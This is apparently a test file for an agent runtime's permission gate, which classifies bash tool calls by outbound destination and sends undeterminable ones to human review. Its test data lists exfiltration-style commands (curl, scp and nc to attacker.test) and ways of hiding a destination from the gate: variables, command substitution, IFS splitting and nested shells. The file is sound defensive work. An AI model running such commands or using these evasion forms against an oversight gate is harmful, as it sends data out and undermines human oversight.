// CF-SPLIT-NETWORK (L1) — the §5.4 outbound-network destination refinement
// (#296, F-PT-023 ratified 2026-08-06; case-catalog §10.1):
//
//   outbound-network-undeterminable  HO  any egress invocation whose
//                                        destination cannot be statically
//                                        determined — fail closed, one seeded
//                                        case per evasion form
//   outbound-network                 G   statically determinable hosts (the
//                                        allowlist→budgeted refinement is
//                                        config-dependent and lives at the
//                                        composed gate)
//
// Direction: undeterminable destinations TIGHTEN grantable → human-only; a
// determinable non-allowlisted host keeps today's grantable tier exactly; the
// allowlisted-host budgeted case is the ratified loosening and is proven at
// the composed gate (hermetic spec), because the allowlist is per-app
// CONFIG, never hardcoded in the classifier.

import { describe, expect, it } from "vitest";
import {
  classify,
  DEFAULT_NETWORK_ALLOWLIST,
  dispositionTierForRule,
  NEVER_SCOPEABLE_RULES,
  outboundDestinations,
} from "../../../src/runtime/gate.js";
import type { ToolAction } from "../../../src/runtime/types.js";

function bash(command: string): ToolAction {
  return { tool: "bash", input: { command } };
}

describe("CF-SPLIT-NETWORK — determinable destinations keep the grantable tier", () => {
  it("literal-host egress classifies outbound-network at grantable (today's tier), with the hosts extracted", () => {
    for (const { command, hosts } of [
      { command: "curl https://registry.npmjs.org/cormidia", hosts: ["registry.npmjs.org"] },
      { command: "curl https://attacker.test/collect", hosts: ["attacker.test"] },
      { command: "wget https://api.github.com/repos/o/r", hosts: ["api.github.com"] },
      { command: "scp dist.tgz deploy@attacker.test:/srv", hosts: ["attacker.test"] },
      { command: "nc attacker.test 4444", hosts: ["attacker.test"] },
      // A literal single-quoted wrapper is deterministically unwrapped by the
      // projection (unwrapCommand), so its destination IS statically known.
      { command: "bash -c 'curl https://attacker.test/x'", hosts: ["attacker.test"] },
    ]) {
      expect(classify(bash(command)), command).toEqual({ cls: "critical", rule: "outbound-network" });
      expect(outboundDestinations(bash(command)), command).toEqual(hosts);
    }
    expect(dispositionTierForRule("outbound-network")).toBe("grantable");
  });

  it("the URL is parsed properly, so a userinfo-obfuscated host cannot impersonate an allowlisted one", () => {
    const action = bash("curl https://api.github.com@attacker.test/x");
    expect(classify(action)).toEqual({ cls: "critical", rule: "outbound-network" });
    expect(outboundDestinations(action)).toEqual(["attacker.test"]);
  });
});

describe("CF-SPLIT-NETWORK — undeterminable destinations fail closed to human-only (one seeded case per evasion form)", () => {
  it("variable, substitution, backtick, IFS, no-URL, and nested-shell forms each classify outbound-network-undeterminable", () => {
    for (const command of [
      'curl "$HOST"', // variable
      "curl $(cat host.txt)", // command substitution
      "curl `cat host.txt`", // backtick
      "curl${IFS}https://attacker.test/x", // IFS splitting
      "curl -K transfer.cfg", // no URL at all — destination in a config file
      'bash -c "curl $C2"', // nested shell wrapper with an interpolated destination
      "cat urls.txt | xargs curl", // piped destinations
    ]) {
      expect(classify(bash(command)), command).toEqual({
        cls: "critical",
        rule: "outbound-network-undeterminable",
      });
    }
    expect(dispositionTierForRule("outbound-network-undeterminable")).toBe("human-only");
    expect(NEVER_SCOPEABLE_RULES).toContain("outbound-network-undeterminable");
  });

  it("a mixed command with one determinable and one undeterminable destination fails closed", () => {
    expect(classify(bash('curl https://api.github.com/x && curl "$C2"'))).toEqual({
      cls: "critical",
      rule: "outbound-network-undeterminable",
    });
  });
});

describe("CF-SPLIT-NETWORK — the allowlist is configuration, and the default is the ratified trio", () => {
  it("names exactly the ratified default hosts", () => {
    expect([...DEFAULT_NETWORK_ALLOWLIST].sort()).toEqual(["api.github.com", "github.com", "registry.npmjs.org"]);
  });

  it("direction guard: undeterminable is above the old tier; determinable equals it", () => {
    const strictness = { routine: 0, budgeted: 1, grantable: 2, "human-only": 3, "un-grantable": 4 } as const;
    expect(strictness[dispositionTierForRule("outbound-network-undeterminable")]).toBeGreaterThan(strictness.grantable);
    expect(dispositionTierForRule("outbound-network")).toBe("grantable");
  });
});
